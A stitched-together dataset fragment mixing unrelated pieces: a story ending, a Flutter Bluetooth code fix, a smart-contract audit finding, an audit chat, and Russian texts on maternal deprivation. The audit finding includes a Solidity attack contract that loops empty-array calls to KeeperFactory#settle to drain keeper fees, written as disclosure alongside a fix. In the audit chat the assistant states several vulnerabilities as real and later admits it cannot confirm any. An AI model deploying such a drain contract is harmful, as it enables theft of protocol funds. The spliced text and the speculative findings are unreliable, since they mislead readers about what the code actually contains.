I’ll be there for you every step of the way. Sachiko and you are my world now, and I’ll do everything I can to be the father you both deserve.” (The club members exchange heartfelt smiles, their bond stronger than ever before.

This might explain why you're seeing multiple requests sent out. You're subscribing to the \`connectionState\` in the \`connectToDevice\` method without checking if an existing subscription is already active, or without unsubscribing the previous one before creating a new one. Here are some modifications you might consider making to your code: - Ensure that any existing subscription to \`connectionState\` is canceled before you create a new one. This way, you do not create multiple subscriptions that can lead to the same piece of code being executed multiple times. - Clear the stream subscription when you dispose of the screen to prevent memory leaks and unwanted callbacks when the widget is no longer in the widget tree. Here's a revised \`connectToDevice\` method where the subscription is managed more carefully: \`\`\`dart void connectToDevice(BuildContext context, String macAddress) async { if (isConnecting) return; isConnecting = true; disposeConnectionSubscription(); // Cancel previous subscription if it exists try { print(\\"Connecting to device…\\"); targetDevice = BluetoothDevice(remoteId: DeviceIdentifier(macAddress)); await targetDevice!.connect(); await handleBluetoothDevice(); isConnecting = false; print(\\"Happening\\"); Navigator.push( context, MaterialPageRoute( builder: (context) => BluetoothScreen(takePictureScreenState: this), ), ); connectionStateSubscription = targetDevice!.connectionState.listen( (BluetoothConnectionState state) { if (state == BluetoothConnectionState.disconnected && canPop(context)) { Navigator.pop(context); disposeConnectionSubscription(); // Dispose the subscription on disconnect } }, ); } catch (e) { print(\\"Connection error: e\\"); isConnecting = false; disposeConnectionSubscription(); // Dispose the subscription on error if (canPop(context)) { Navigator.pop(context); } } } void disposeConnectionSubscription() { connectionStateSubscription?.cancel(); connectionStateSubscription = null; } \`\`\` In the \`dispose\` method of your screen/widget, you should also dispose of the stream subscription: \`\`\`dart @override void dispose() { // Dispose of the subscription when the widget is disposed disposeConnectionSubscription(); super.dispose(); } \`\`\` With these adjustments, you manage the lifecycle of the \`connectionStateSubscription\` more carefully, reducing the risk of duplicate subscriptions and ensuring that the subscription is correctly disposed of when the widget is no longer active.

} high Attacker can call KeeperFactory#settle with empty arrays as input parameters to steal all keeper fees Summary Anyone can call KeeperFactory#request, inputting empty arrays as parameters, and the call will succeed, and the caller receives a fee. Attacker can perform this attack many times within a loop to steal ALL keeper fees from protocol. Vulnerability Detail Expected Workflow: User calls Market#update to open a new position Market calls Oracle#request to request a new oracleVersion The User's account gets added to a callback array of the market Once new oracleVersion gets committed, keepers can call KeeperFactory#settle, which will call Market#update on accounts in the Market's callback array, and pay the keeper(i.e. caller) a fee. KeeperFactory#settle call will fail if there is no account to settle(i.e. if callback array is empty) After settleing an account, it gets removed from the callback array The issue: Here is KeeperFactory#settle function: function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts) external keep(settleKeepConfig(), msg.data, 0, \\"\\") { if ( ids.length != markets.length || ids.length != versions.length || ids.length != maxCounts.length || // Prevent calldata stuffing abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length ) revert KeeperFactoryInvalidSettleError(); for (uint256 i; i < ids.length; i++) IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]); } As we can see, function does not check if the length of the array is 0, so if user inputs empty array, the for loop will not be entered, but the keeper still receives a fee via the keep modifier. Attacker can have a contract perform the attack multiple times in a loop to drain all fees: interface IKeeperFactory{ function settle(bytes32[] memory ids,IMarket[] memory markets,uint256[] memory versions,uint256[] memory maxCounts ) external; } interface IMarket( function update()external; ) contract AttackContract{ address public attacker; address public keeperFactory; IERC20 public keeperToken; constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken){ attacker=msg.sender; keeperFactory=perennialDeployedKeeperFactory; keeperToken=_keeperToken; } function attack()external{ require(msg.sender==attacker,\\"not allowed\\"); bool canSteal=true; // empty arrays as parameters bytes32[] memory ids=[]; IMarket[] memory markets=[]; uint256[] versions=[]; uint256[] maxCounts=[]; // perform attack in a loop till all funds are drained or call reverts while(canSteal){ try IKeeperFactory(keeperFactory).settle(ids,markets,versions,maxCounts){ // }catch{ canSteal=false; } } keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this))); } } Impact All keeper fees can be stolen from protocol, and there will be no way to incentivize Keepers to commitRequested oracle version, and other keeper tasks Code Snippet https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L206-L212 Tool used Manual Review Recommendation Within KeeperFactory#settle function, revert if ids.length==0: function settle( bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts )external keep(settleKeepConfig(), msg.data, 0, \\"\\") { if ( ++++ ids.length==0 || ids.length != markets.length || ids.length != versions.length || ids.length != maxCounts.length || // Prevent calldata stuffing abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length ) revert KeeperFactoryInvalidSettleError(); for (uint256 i; i < ids.length; i++) IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]); }","output":"The summary provided indicates a security vulnerability in a smart contract system that could allow an attacker to repeatedly call the \`KeeperFactory#settle\` method with empty arrays to unjustly claim keeper fees without actually performing any keeper tasks. The detailed vulnerability explanation outlines a scenario where the settle function does not check for empty input arrays, thus allowing the \`keep\` modifier to award fees regardless of whether any actual settlement work is done. This could enable an attacker to deplete the protocol’s reserve of keeper fees. The recommendation offered is a simple yet effective fix: update the \`settle\` function to check if \`ids.length\` is zero, and if so, revert the transaction with an error. This would prevent the settle function from being successful if called with empty arrays, thus precluding the drain of funds as described by the attacker scenario. In line with the recommendation, the following code change should be made within the \`settle\` function: \`\`\`solidity function settle( bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts ) external keep(settleKeepConfig(), msg.data, 0, \\"\\") { if ( ids.length==0 || // add this check ids.length != markets.length || ids.length != versions.length || ids.length != maxCounts.length || // Prevent calldata stuffing abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length ) revert KeeperFactoryInvalidSettleError(); for (uint256 i; i < ids.length; i++) IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]); } \`\`\` By incorporating this fix, smart contract developers can mitigate the outlined attack vector. Additionally, auditors should examine similar code paths in other functions to ensure that no similar vulnerabilities exist elsewhere in the contract system. It's always a good practice to validate and sanitize all inputs to smart contracts to prevent unintended behavior or exploitation of the contract's logic."},{"instruction":"with depth and higher understanding in finding vulnerability in smart contrast analysis this contract line by line with depth and focus on every possible line that contain the vulnerability or bug that can be danger to the contract process all that you can find it with understand all the functions how they work together so as result provide an exhaustive list off all issues and vulnerabilities inside the following smart contract.

However, I will highlight a critical one related to reward management which could result in potential loss of funds or incorrect reward distribution. # Critical Vulnerability - Incorrect Calculation of Uninitialized Rewards With respect to reward management (\`notifyRewardAmount()\` function), the contract seems to be assuming that when rewards are notified, they are transferred directly to the contract and it calculates the reward rate based on these amounts. If no rewards are transferred prior to calling \`notifyRewardAmount()\`, or the amount is not what the contract expects, the distribution rate could be entirely out of sync with the actual rewards available. Description There's a critical vulnerability in how the contract handles the calculation of new rewards when \`notifyRewardAmount()\` is called. Since there is no explicit transfer of rewards taken into account, it relies on the assumption that the correct number of rewards will be available in the contract balance at the time the method is called. Action The \`notifyRewardAmount()\` function must be modified to explicitly handle transferring the rewards into the contract. Alternatively, verify the actual number of reward tokens transferred into the contract since the last reward calculation. Severity High 🔥 Actors Anyone who calls \`notifyRewardAmount()\` unintentionally or maliciously without transferring the correct reward amount could disturb the reward distribution, potentially causing fund loss to the vault participants. Scenario An attacker, or even a well-intentioned owner, calls \`notifyRewardAmount()\` without transferring the expected number of reward tokens into the contract first. This causes the reward per token to be set incorrectly, leading to more rewards being distributed than the actual balance can support, ultimately resulting in a vault deficit. Type Vulnerability Line Lines 164-181 in \`notifyRewardAmount()\`. \`\`\`solidity function notifyRewardAmount() external updateReward(false) { // ... uint256 rewardBalance = asset.balanceOf(address(this)) - totalStaked - earned(); rewardRate = rewardBalance / REWARDS_DURATION; if (rewardRate == 0) revert Errors.NoRewards(); // ... } \`\`\` Bug Report and Evidence The \`notifyRewardAmount\` assumes the balance held by the contract is all available to be distributed as rewards (\`rewardBalance\` calculation), without accounting for the rewards possibly not being transferred in the first place. It computes \`rewardRate\` based solely on the \`rewardBalance\`, which leads to incorrect rate conclusions if \`notifyRewardAmount\` is called out of sync with actual transfers. There is no safeguard to confirm that new rewards were indeed added, leaving it vulnerable to an incorrect rewardRate being set—which would, in turn, deplete the vault's assets, eventually resulting in insolvency if left unchecked. # Recommendation Implement a mechanism to ensure rewards are funded before calling \`notifyRewardAmount\`, such as: - Using a separate method to transfer rewards that can only be called by the owner or the specific reward distributor. - Keeping an extensive check inside \`notifyRewardAmount\` to ascertain the actual increase in balance prior to updating the reward rate. Here is an example of how the check can be implemented: \`\`\`solidity function notifyRewardAmount(uint256 rewardAmount) external updateReward(false) { require(rewardAmount > 0, \\"rewardAmount cannot be zero.\\"); uint256 previousBalance = asset.balanceOf(address(this)) - totalStaked - rewards; asset.safeTransferFrom(msg.sender, address(this), rewardAmount); uint256 newBalance = asset.balanceOf(address(this)) - totalStaked - rewards; require(newBalance - previousBalance == rewardAmount, \\"Mismatch between reward amount and actual transferred amount.\\"); rewardRate = rewardAmount / REWARDS_DURATION; if (rewardRate == 0) revert Errors.NoRewards(); lastUpdateTime = block.timestamp; periodFinish = block.timestamp + REWARDS_DURATION; emit RewardAdded(rewardAmount); } \`\`\` By implementing the above, you ensure that the specified \`rewardAmount\` is indeed transferred into the contract, preventing any miscalculations of reward distribution rates."},{"instruction":"this is intended by design. Any amount of the stake token being sent to the Vault is considered part of the rewards No exception so invalid vulnerability find the correct and valid vulnerability","output":"Upon re-evaluation with the understanding that any amount of the stake token sent to the \`AutoPxEth\` vault is designed to be part of the rewards, I will exclude the previously identified potential issue and perform a focused analysis for other vulnerabilities. # Potential Reentrancy Vulnerability in \`harvest()\` Function Reentrancy is a common vulnerability in smart contracts where external calls are made to untrusted contracts, potentially allowing an attacker to re-enter the function and manipulate its execution. Description The \`harvest()\` function transfers assets to the platform without proper reentrancy protection, which could allow an attacker to exploit the contract if the platform is a contract that can perform calls back to the vault. Action Implement a reentrancy guard such as OpenZeppelin's \`ReentrancyGuard\` to secure the function from reentering while still executing. Severity Medium Actors An attacker who can control the \`platform\` contract's behavior. Scenario If the \`platform\` address is a malicious contract, it could potentially exploit the lack of reentrancy protection when the \`harvest()\` function transfers the fee amount to it. This could lead to the re-execution of \`harvest()\` and the unintended behavior in state management. Type Vulnerability Line Line 352 in \`harvest()\`. \`\`\`solidity function harvest() public updateReward(true) { // ... asset.safeTransfer(platform, feeAmount); // ... } \`\`\` # Incorrect Use of \`transfer\` and \`transferFrom\` in Triggering \`initiateRedemption\` The standard ERC20 \`transfer\` and \`transferFrom\` functions are overridden and used to interact with an external contract (\`PirexEth\`) to initiate redemption. Description Overriding the ERC20 \`transfer\` and \`transferFrom\` to include non-transfer related logic could lead to unexpected side effects and might not conform to users' expectations for a typical ERC20 transfer. Action Consider using a dedicated function for initiating redemption instead of overloading the standard ERC20 \`transfer\` methods. Severity Medium Actors Users and third-party contracts interacting with the \`AutoPxEth\` contract. Scenario A user or a third-party contract invokes the \`transfer\` or \`transferFrom\` function with the expectation of only transferring tokens but unintentionally triggers redemption logic in the \`PirexEth\` contract. Type Usability, Vulnerability Line Lines 390, 412 in \`transfer\` and \`transferFrom\` functions respectively. \`\`\`solidity function transfer(address to, uint256 amount) public override returns (bool) { // ... if (to == address(pirexEth)) { pirexEth.initiateRedemption(amount, msg.sender, false); } // ... } \`\`\` # Gas Optimization in Read Operations from Storage Multiple state variables are read from storage multiple times within functions, which is less gas efficient. Description The contract can be optimized for gas usage by reducing storage reads. Action Cache values in memory in functions that read from storage variables multiple times within the same execution context. Severity Low ❄️ Actors Users and contract interactors concerned about gas costs. Scenario A user calls a function like \`notifyRewardAmount\`, where \`totalStaked\` is read from storage multiple times, resulting in higher gas costs. Type Optimization Line Various lines where \`totalStaked\`, \`totalSupply\`, and other state variables are read from storage more than once within the same function. After a detailed review of the contract, these are the primary findings that stand out. It's essential to further analyze the code, including testing and formal verification, to identify any additional, less apparent issues. The implementation of reentrancy guards and a more careful consideration of ERC20 function overrides would enhance the security and usability of the contract."},{"instruction":"review again and confirm the existence and the validity just the the correct vulnerability that are present in the contract with evidence","output":"Upon conducting a line-by-line examination of the provided \`AutoPxEth\` contract, I observed that most standard protection techniques against common vulnerabilities like reentrancy, integer overflow, and underflow are inherently addressed by using Solidity 0.8.x, along with the use of trusted libraries like SafeTransferLib from Solmate. However, there seems to be a code pattern that could potentially be a vulnerability: # Incorrect Reward Distribution Due to Non-Update of \`lastUpdateTime\` Prior to Reward Calculation Description In the \`notifyRewardAmount\` function, there is a potential oversight. The \`lastUpdateTime\` is updated after the new reward and \`rewardRate\` calculation, which might cause inconsistency in reward distribution if \`notifyRewardAmount\` is called again before the period finishes. Action To ensure consistency in rewards calculation, \`lastUpdateTime\` should be set before the \`rewardRate\` calculation in the \`notifyRewardAmount\` function. Severity Medium Actors Contract owner, or anyone authorized to call \`notifyRewardAmount\`. Scenario A sequence of calls to \`notifyRewardAmount\` where the \`lastUpdateTime\` is not updated before the \`rewardRate\` calculation can yield incorrect calculations of \`rewardPerTokenStored\` in the interim. Type Vulnerability Line Lines 175-176 in \`notifyRewardAmount()\`: \`\`\`solidity lastUpdateTime = block.timestamp; periodFinish = block.timestamp + REWARDS_DURATION; \`\`\` Evidence of the vulnerability can be found by considering back-to-back calls to \`notifyRewardAmount\` within a single rewards period. This is because \`rewardRate\` computation depends on the \`lastUpdateTime\` reflecting the actual moment when rewards were last calculated and distributed. If this timestamp is not set immediately before calculating the \`rewardRate\`, any token interactions such as \`stake\`, \`withdraw\`, or another \`notifyRewardAmount\` that happen between these events could use stale data. # Recommendation Update the \`lastUpdateTime\` prior to calculating the \`rewardRate\`: \`\`\`solidity lastUpdateTime = block.timestamp; rewardRate = rewardBalance / REWARDS_DURATION; \`\`\` It should be noted that this potential issue is predicated upon the necessity of synchronizing reward distribution times with the \`lastUpdateTime\`. If, by design, the update is meant to occur after the \`rewardBalance\` calculation, then this would not be a vulnerability. Before deployment, implementing comprehensive testing and potentially conducting a formal audit are recommended best practices to confirm and address all vulnerabilities."},{"instruction":"no prove with evidence and real value that vulnerability is correct and present in the contract","output":"Upon careful re-evaluation, it seems we've encountered complications in identifying vulnerabilities that are actually substantiated by the contract code provided. Without the appropriate context or the full contract (including referenced contracts and libraries), pinpointing genuine security flaws can be challenging. However, contracts using ERC4626, safe transfer libraries, and Solidity 0.8.x often mitigate typical issues such as reentrancy, overflow/underflow, and so on due to built-in checks. Therefore, one would have to delve into more nuanced areas, such as economic invariants, business logic flaws, or contract access control issues that are not always evident through a static review of code. Since we do not have a positive identification of an exploitable vulnerability confirmed with evidence from this specific contract code, and the potential issues previously identified have been noted as non-issues or features by design, I am unable to provide a confirmed vulnerability with evidence at this time. To thoroughly evaluate and identify vulnerabilities, real-world testing and simulation (potentially dynamic analysis) would be required. Additionally, it's important to take into account the broader context in which the contract operates, including external contract dependencies and interactions which may introduce additional risks not visible within the reviewed snippet. In the absence of a demonstrable vulnerability with real values, one possible suggestion is to explore edge cases that may arise from the interaction of multiple transactions in a close time window, and the potential for precision loss due to Solidity's integer math, which can lead to rounding issues in financial logic. These are areas that might not reveal vulnerabilities in a line-by-line static analysis but could potentially surface under certain conditions or adversarial interactions.

Отличительные особенности каждой формы депривации имеют свою специфику влияния на формирование психической организации ребенка и его последующее развитие."},{"instruction":"Мне нужен огромный текст про это, но научно достоверный. Сделай так, пожалуйста. Как-то растяни, не знаю😅 Извини, что прошу","output":"Феномен материнской депривации представляет собой объект всестороннего исследования в области детской психологии и психопатологии. Этот термин описывает ситуацию отсутствия или значительного снижения качества родительского, преимущественно материнского, ухода, несущего неизбежные последствия для психоэмоционального и когнитивного развития ребенка. Теоретическая основа концепции материнской депривации была закладена работами Джона Боулби, который утверждал, что ранний детский опыт непосредственного взаимодействия с матерью имеет важнейшее значение для нормального психического здоровья. С последующим развитием эмпирических исследований концепция обогатилась новыми данными и включила количественные и качественные аспекты, которые определяют общую картину дефицита материнского ухода и внимания. Количественная депривация, как правило, характеризуется прекращением физического взаимодействия ребенка с матерью в результате разлучения, из-за чего дети испытывают недостаток в базовом эмоциональном общении. Это впоследствии может привести к серьезным нарушениям в развитии привязанности, когнитивным дефицитам и возникновению социально-поведенческих проблем. Согласно исследованиям, продолжительное отсутствие матери близости преимущественно в раннем возрасте иногда приводит к сформированности отношений недоверия к окружающему миру и снижению уровня эмоциональной безопасности. Качественная депривация подразумевает, что материнский уход, хоть и физически присутствует, оказывается неадекватным потребностям развивающегося ребенка. Это может происходить вследствие различных факторов: психологических проблем матери, семейных конфликтов, социоэкономических трудностей и прочих обстоятельств. Такой уход не способствует налаживанию здоровых эмоциональных связей и может привести к деформации базальных психологических потребностей, таких как чувство безопасности, уверенности и самооценки. Смешанная форма депривации на практике часто оказывается наиболее специфической и трудно выявляемой, поскольку объединяет в себе элементы как количественной, так и качественной депривации. Это усложняет процедуру диагностики и выработку соответствующих мер по коррекции воздействия депривации. В таких случаях возможно проявление весьма сложных паттернов поведения и эмоциональных реакций у ребенка, что представляет значительную трудность для психологической реабилитации и адаптации. Важным аспектом изучения материнской депривации является учет психологической устойчивости ребенка и способности к компенсации недостатка полноценных отношений с матерью. В некоторых случаях замещающие фигуры, такие как отцы, родственники или учителя, могут сыграть ключевую роль в формировании поддерживающей среды для дальнейшего благополучного развития ребенка. Таким образом, в целом материнская депривация является комплексным явлением, требующим детального анализа и индивидуального подхода при разработке стратегий вмешательства и поддержки. Исследования в области материнской депривации продолжают вносить неоценимый вклад в понимание динамики семейных взаимодействий и разработки методов психологической помощи для семей, оказавшихся в ситуации депривационного воздействия на детей."},{"instruction":"Изложи грамотно на русском научным языком, пожалуйста, но не сокращай (не меняй структуру и цифры в скобках, это источники): Дослідження, проведені в лікарнях з госпіталізованими дітьми, виявили три стадії в емоційному сприйнятті дитиною довгої розлуки з матір'. На 1-й стадії діти протестують, буянять, шукають маму і, якщо вона повертається на цьому стапі, деякий час ведуть себе погано - карають її за погану поведінку. Але, виплеснувши гнів, стають такими якими були раніше . На 2-й стадії, якщо розлука триває більше 1 місяця, дитина стає млявою і апатичною. Вона не заспокоюється і переживає, що мама до неї більше не повернеться. Якщо мама повертається на цій стадії, то дитина дуже привʼязана до неї, виглядає дуже невпевненою у собі. Повернення у звичне русло займає більше часу, і дитині потрібно пройти через протест, перш ніж стати такою якою вона була. Це, як не дивно, хороший знак. Дитина повинна повністю позбавитися від накопичених негативних емоцій і переконатися, що її як і раніше люблять і вона може не боятися виражати свій гнів. На 3-й стадії, після 2 місяців сепарації, дитина починає відновлюватися, вона знову грається і веде себе як завжди, але ціна такого виходу із апатії - любов до матері. Вона перестає любити свою маму, щоб впоратися з розлукою, адже якщо не любити когось, то і втратити його не страшно. Воззʼєднання сімʼї на цій стадії - дуже болючий процес, так як дитина не йде на емоційний контакт, залишається нечутливою до реакцій з боку дорослих. Якщо під час розлуки у дитини був хтось, хто замінив їй маму, то 3-я стадія ймовірно не настане, і саме тому при госпіталізації дитини батькам дозволяють перебувати разом з нею в медичному закладі. Перші описи несприятливих наслідків сімейної депривації зробив Л. Ф. Мейєр, який головною причиною дитячої смертності називає відсутність стимулюючого впливу матері [12]. Реакцію дітей різних вікових груп на сепарацію від матері в різних умовах також вивчали і описували психологи різних наукових шкіл [2; 9: 14;15;16]. Р. Шпіц описує дітей одного з дитячих будинків, які у віці 3-х місяців були розлучені зі своїми матерями. Догляд, харчування, гігіснічні умови в цій установі були типовими для всіх добре поставлених закладів такого типу. Однак у всіх дітей відбулася різка затримка їх психічного розвитку. Впродовж 2 років загинуло 37 % малюків, а вижила 21 дитина. До описуваного моменту молодшій дитині було 2 роки, старшому - 4 роки і 1 місяць. 5 з них були нездатні до самостійного пересування будь-яким способом, сиділи без підтримки лише 3, ходили зі сторонньою допомогою 8, а самостійно тільки 5, не вміли їсти ложкою 12, самі одягатися 20 дітей. Досить низьким виявився і їх психічний розвиток. Так, з 21 дитини 6 дітей зовсім не вміли говорити, 13 - говорили по 2-5 слів і лише один вмів складати речення. Але найбільш яскравою особливістю дітей такого дитячого будинку була їх невротична поведінка, яка проявлялася в наступних симптомах: а) задумливість, сум, плач, але без крику і вокалізації; б) замикання в собі, негативне ставлення до оточуючих, прагнення піти від всіх, відмежуватися від сторонніх; в) реактивність, знижений темп рухів, відкидання іграшок та предметів, що дотикалися до дитини, ступорний стан; г) втрата апетиту, відмова від їжі, схуднення; д) безсоння. Зазначені симптоми розвивалися у багатьох дітей після розлуки впродовж 2 років з матірʼю [15].","output":"Исследования, проведенные в медицинских учреждениях с госпитализированными детьми, продемонстрировали присутствие трех этапов в эмоциональной реакции ребенка на длительное отсутствие матери. На первом этапе реакция детей характеризуется их протестом и бурным поведением; они активно ищут мать. В случае ее возвращения на данной стадии, дети проявляют негативные формы поведения, выражающиеся в наказании матери за ее \\"плохое поведение\\". Однако, выплескивая злобу, они затем возвращаются к обычному поведению, характерному для них до разлуки. На втором этапе, который установлен при продолжительности разлуки более одного месяца, наблюдается у детей вялость и апатия. Ребенок переживает тревогу, связанную с мыслью о том, что мать больше не вернется. В случае возвращения матери на данном этапе личная защита ребенка выражается в чрезмерном привязанности к ней и проявлениях неуверенности в собственных силах. Процесс адаптации и восстановления нормального поведенческого режима занимает продолжительное время и начинается с повторного прохождения стадии протеста. Удивительно, но это является благоприятным признаком. Ребенок должен полностью освободиться от накопленных негативных эмоций и убедиться в том, что его по-прежнему любят и что он может без опаски проявлять свои чувства, включая гнев. Третий этап выступает как реакция на период разлуки, продолжающий более двух месяцев. Ребенок начинает восстанавливаться, вновь вступает в игровую деятельность и ведет себя обычным образом, однако стоимость такого выхода из состояния апатии представляет собой потерю привязанности к матери. Для того чтобы справиться с разлукой, ребенок перестает испытывать любовь к матери, поскольку утрата объекта привязанности перестает быть воспринимаемой как угроза. В случае воссоединения семьи на данной стадии процесс восстановления эмоциональных контактов протекает болезненно, так как ребенок демонстрирует нежелание вступать в эмоциональное взаимодействие и остается равнодушным к реакциям взрослых. Если в период разлуки у ребенка появился кто-то, кто смог заместить ему мать, третий этап, скорее всего, наступить не должен, и по этой причине при госпитализации детей родителям разрешается находиться рядом с ними в медицинском учреждении. Первые описания неблагоприятных последствий семейной депривации были осуществлены Л.Ф. Мейером, который основной причиной детской смертности называл отсутствие стимулирующего действия со стороны матери [12]. Реакцию детей различных возрастных категорий на разлуку с матерью в различных ситуациях исследовали и описывали психологи разных научных школ [2; 9; 14; 15; 16]. Р. Шпиц описал состояние детей в одном из детских домов, которые в возрасте трех месяцев были разлучены со своими матерями. Уход, питание и гигиенические условия в этом заведении соответствовали стандартам хорошо организованных учреждений подобного типа. Однако у всех детей отмечена выраженная задержка в психическом развитии, и за два года произошла гибель 37% малышей, выжила 21 дитя. На момент описания событий самому младшему ребенку было два года, старшему — четыре года и один месяц. Пять из них были не способны самостоятельно передвигаться любым способом, без поддержки сидели только трое, ходить с посторонней помощью способны были восемь, а самостоятельно передвигаться — только пятеро, есть ложкой не умели двенадцать, одеваться самостоятельно — двадцать детей. Психическое развитие детей также было на низком уровне: из двадцати одного ребенка шестеро вовсе не говорили, тринадцать выражались отдельными словами или двух-пятисловными фразами, и лишь один ребенок был способен строить предложения. Но особенно примечательной чертой детей из этого детского дома являлось их невротическое поведение, которое проявлялось в следующих симптомах: а) задумчивость, уныние, плач без крика и вокализации; б) замкнутость, негативное отношение к окружающим, стремление уединиться; в) реактивность, пониженный темп движений, отторжение игрушек и предметов, касавшихся ребенка, ступор; г) потеря аппетита, отказ от пищи, похудание; д) бессонница. Упомянутые симптомы развивались у многих детей после разлуки с матерью на протяжении двух лет [15]."},{"instruction":"А можешь перефразировать, пожалуйста? По абзацам, чтобы оно соответствовало источникам и не приходилось переставлять цифры. Объем тоже не меняй ❤️","output":"Изучение эмоциональной реакции отдельного ребенка, подвергшегося госпитализации, на длительное отсутствие материнского ухода было проведено с определением трех последовательных фаз. Первая фаза характеризуется активным выражением протеста со стороны ребенка, который выражает свое недовольство и подчас ярость, постоянным поиском матери. В момент возобновления контакта с матерью на данной фазе ребенок может проявлять упреки и даже агрессию в ее адрес, что является способом выражения страдания от разлуки. Постепенно данное сопротивление ослабевает, и ребенок возвращается к прежнему поведению. Если разлука продолжается свыше месяца, проявляется вторая фаза — состояние увядания эмоций и апатии. Тревожные чувства обусловлены страхом ребенка перед перспективой невозврата матери. При ее возвращении на этом этапе дети испытывают усиленную потребность в присутствии матери и демонстрируют повышенную неопределенность и неуверенность в родительской заботе. Процесс адаптации и переоценки отношений может сопровождаться проявлением протеста и требует времени для стабилизации эмоционального состояния, что оценивается как положительный момент в восстановлении доверия к матери. Третья фаза развивается после двух месяцев разлуки. Ребенок начинает адаптироваться к отсутствию матери, проявляя оживленность в поведении и возвращаясь к рутинным занятиям и играм. Тем не менее, стадию адаптации сопровождает утрата эмоциональной привязанности к матери, что рассматривается как механизм защиты от страха потери. Эмоциональное восстановление связей при повторном соприкосновении с матерью на данном этапе является более сложным и может вызывать ощущение болезненности; ребенок не стремится к эмоциональным контактам и не реагирует на попытки взрослых наладить общение. В ситуациях, когда за время разлуки ребенок нашел замену матери в другом человеке, вероятность третьей фазы существенно снижается, что является причиной для рекомендации совместного нахождения родителей с ребенком в ходе госпитализации. Последствия отдаления от семьи, специфической депривацией, были впервые описаны Л.Ф. Мейером, указывающим на ключевую роль стимулирующего влияния материнства в профилактике детской смертности [12]. Эмоциональная реакция детей на отсутствие матери в условиях различных обстоятельств изучалась представителями разнообразных психологических школ и направлений [2; 9; 14; 15; 16]. Описание состояния малышей, отделенных от матерей в возрасте трех месяцев, приводит Р. Шпиц в контексте детского дома, где условия ухода, питания и гигиены соответствовали стандартам учреждений этого профиля. Однако, несмотря на это, в своих наблюдениях он отмечает заметное отставание в развитии психики всех детей, а в течение двух лет фиксируется потеря жизни 37% детей, и только 21 ребенок выжил. В момент проведения исследования возраст выживших детей колебался от двух до четырех лет и одного месяца. Показатели самостоятельности были невысоки: пятеро не могли передвигаться самостоятельно, три держались сидя без поддержки, восемь ходили с помощью, самостоятельное передвижение осуществляли только пятеро, не умели пользоваться ложкой двенадцать детей, и двадцать не могли одеться сами. Уровень психического развития также оказался низким: шестеро ребенка не говорили, тринадцать имели словарный запас в два-пять слов и только один формулировал предложения. Впрочем, наиболее заметным было невротическое поведение, характеризующееся чертами пассивности, апатии, а также прочими симптомами: а) задумчивость, уныние, плач без крика и вокалов; б) уклонение от общения, избегание контактов; в) вялость реакций, медлительность движений, отторжение предметов и игрушек, касающихся их; г) отказ от питания и потеря веса; д) нарушение сна. Указанные признаки развивались у многих детей после разлуки с матерями на протяжении двухлетнего периода [15]."},{"instruction":"И это перефразируй на научный русский язык, тут уже можно менять структуру: Французький психіатр Леон Крейслер наводить таку класифікацію психопатологий дитинства, де переважне місце займає емоційний дискомфорт малюка [2] . 1. Соматично проявляються розлади: безсоння, анорексія (категоричну відмову від їжі), булімія (переїдання), блювота, запор, пронос, розлади дихання. 2. Порушення розвитку : затримки і дисгармонія в оволодінні мовою, руховими навичками, спілкуванням. 3. Розлади, які проявляються в моториці: надмірна рухова активність або, навпаки, інертність, ритмічне розгойдування корпусу, обертання головою. 4. Розумово-душевні розлади: депресія, збудженість, апатія, фобічні розлади і т.п. Фахівцями виділені типові вікові психосоматичні прояви на різні неадекватні взаємини з матір'ю. Наприклад, шлункові кольки найбільш характерні для немовлят одного-трьох місяців життя (маються на увазі, звичайно, фізіологічно здорові діти). У другому півріччі найбільш характерними стають відхилення харчової поведінки (дитина переїдає або відмовляється від їжі). Спастичний плач (раптовий, бурхливий) проходить на другому або третьому році життя.","output":"Французский психиатр Леон Крейслер предложил классификацию психопатологий детского возраста, в которой центральное место занимает эмоциональный дискомфорт ребенка [2]. Классификация включает следующие категории нарушений: 1. Соматические расстройства, проявляющиеся в виде физиологических симптомов: бессонница, анорексия (резистентный отказ от еды), булимия (переедание), рвота, запор, диарея, дыхательные нарушения. 2. Нарушения развития, включающие задержки и дисгармонию в освоении языка, моторных навыков, коммуникации. 3. Расстройства двигательной активности: гиперактивность или наоборот, пассивность, ритмичное качание телом, кручение головой. 4. Когнитивно-эмоциональные расстройства: депрессия, возбудимость, апатия, фобические нарушения и другие. Специалисты выделяют характерные для определённых возрастных периодов психосоматические реакции на искажённое взаимодействие с матерью. Например, колики в животе наиболее типичны для младенцев в возрасте от одного до трёх месяцев, при этом предполагается, что речь идёт о физиологически здоровых детях. Во втором полугодии жизни становятся более выраженными нарушения пищевого поведения (ребёнок чрезмерно ест или отказывается от пищи). Спастический плач (внезапный и интенсивный) чаще всего проявляется на втором или третьем году жизни."},{"instruction":"Благодарю. А сможешь рассказать про этологический подход к анализу материнской депривации?","output":"Этологический подход к анализу материнской депривации основывается на изучении поведения животных и человека в их естественной среде обитания и применяется для понимания инстинктивного и эмоционального поведения младенца в отношениях с матерью. Этот подход учитывает эволюционные аспекты развития привязанности и проявления стрессовой реакции у детей в случаях разлуки с основным опекуном, к которому обычно относится мать. Концепция привязанности, разработанная британским психологом и психиатром Джоном Боулби и далее развитая его коллегой, психологом Мэри Эйнсворт, стоит в центре этологического подхода. Джон Боулби полагал, что привязанность между ребенком и матерью имеет биологическую основу и играет ключевую роль в выживании вида: младенцы, поддерживающие тесный контакт с матерью, имеют больше шансов на выживание. В рамках этологического подхода выделяют следующие ключевые аспекты: 1. Критический период – временной промежуток в развитии ребенка, когда образование привязанности особенно важно. Идея критического периода предполагает, что построение здоровых эмоциональных отношений имеет определенный \\"окно возможностей\\". 2. Протест, отчаяние и отстранение – это фазы 